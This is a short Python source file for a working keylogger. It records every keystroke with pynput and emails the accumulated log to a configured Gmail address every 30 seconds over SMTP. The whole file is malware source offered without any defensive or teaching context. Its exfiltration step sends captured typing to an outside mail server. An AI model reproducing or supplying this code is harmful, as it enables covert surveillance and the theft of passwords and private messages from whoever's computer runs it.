from pynput import keyboard
import smtplib
from dotenv import load_dotenv
import os
import threading

load_dotenv()

mail = os.getenv("MAIL")
password = os.getenv("PASS")

log = [""]


def callback_function(key):
    global log
    try:
        log.append(key.char)
        # log.append(key.char.encode("utf-8"))
    except AttributeError:
        if key == key.space:
            log.append(" ")
        else:
            log.append(key.name)
    except:
        pass

    # print(",".join(log))


def send_mail(message):
    mail_server = smtplib.SMTP("smtp.gmail.com", 587)
    mail_server.starttls()
    mail_server.login(mail, password)
    mail_server.sendmail(mail, mail, message)


def thread_function():
    global log
    parser_log = ",".join(log)
    send_mail(parser_log.encode("utf-8"))
    timer_object = threading.Timer(30, thread_function)
    timer_object.start()


# send_mail()

keylogger_listener = keyboard.Listener(on_press=callback_function)

# threading
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
